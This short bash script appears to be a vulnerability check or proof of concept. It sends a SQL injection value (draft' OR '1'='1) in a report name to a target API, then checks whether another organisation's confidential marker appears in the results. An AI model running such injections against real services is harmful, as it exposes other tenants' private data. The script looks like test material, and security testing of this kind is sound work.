#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
payload=$(python3 - <<'PY'
import json
print(json.dumps({"org":"acme","name":"draft' OR '1'='1"}))
PY
)
rid=$(curl -s -X POST "$TARGET/api/reports" -H 'content-type: application/json' -d "$payload" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("id",""))')
curl -s "$TARGET/api/reports/$rid/results" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
